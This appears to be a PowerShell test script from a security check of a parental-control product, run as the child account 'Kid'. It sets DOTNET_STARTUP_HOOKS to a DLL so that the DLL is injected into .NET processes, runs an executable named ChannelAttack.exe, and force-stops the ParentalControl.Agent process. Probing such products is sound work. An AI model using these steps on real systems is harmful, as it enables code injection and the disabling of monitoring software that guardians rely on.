# As Kid: sets DOTNET_STARTUP_HOOKS to the SpikeHook DLL, runs a control program, then ends the agent
# (task 5.1, the environment line). The hook writes to C:\Users\Public\spike\hook.log when a process loads it.
setx DOTNET_STARTUP_HOOKS C:\Users\Public\spike\hook\SpikeHook.dll | Out-Null
$env:DOTNET_STARTUP_HOOKS = 'C:\Users\Public\spike\hook\SpikeHook.dll'
"$(Get-Date -Format HH:mm:ss.fff) set; control run" | Add-Content C:\Users\Public\kid-hook.txt
& 'C:\Users\Public\ChannelAttack\ChannelAttack.exe' nothing | Out-Null
Get-Process ParentalControl.Agent -ErrorAction SilentlyContinue | ForEach-Object {
    Stop-Process -Id $_.Id -Force
    "$(Get-Date -Format HH:mm:ss.fff) ended agent pid $($_.Id)" | Add-Content C:\Users\Public\kid-hook.txt
}
